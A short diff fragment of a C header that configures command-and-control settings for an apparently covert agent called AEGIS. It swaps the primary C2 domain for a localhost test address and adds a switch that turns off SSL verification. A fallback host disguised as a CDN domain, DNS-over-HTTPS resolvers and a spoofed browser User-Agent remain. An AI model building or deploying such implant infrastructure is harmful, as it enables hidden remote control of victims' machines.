@@ -19,12 +19,13 @@
 
 /* ── C2 Configuration ────────────────────────────────────────────────────── */
 
-#define AEGIS_C2_PRIMARY_HOST "cheta4.darkdiamondfront.shop"
-#define AEGIS_C2_PRIMARY_PORT 443
+#define AEGIS_C2_PRIMARY_HOST "127.0.0.1"
+#define AEGIS_C2_PRIMARY_PORT 4443
 #define AEGIS_C2_FALLBACK_HOST "static.content-delivery-net.com"
 #define AEGIS_C2_FALLBACK_PORT 443
 #define AEGIS_C2_DOH_RESOLVER "https://dns.cloudflare.com/dns-query"
 #define AEGIS_C2_DOH_FALLBACK "https://dns.google/dns-query"
+#define AEGIS_C2_SKIP_SSL_VERIFY 1   /* Set to 1 for self-signed certs (testing), 0 for production */
 #define AEGIS_C2_USER_AGENT                                                    \
   "Mozilla/5.0 (X11; Linux x86_64) "                                           \
   "AppleWebKit/537.36 (KHTML, like Gecko) "                                    \
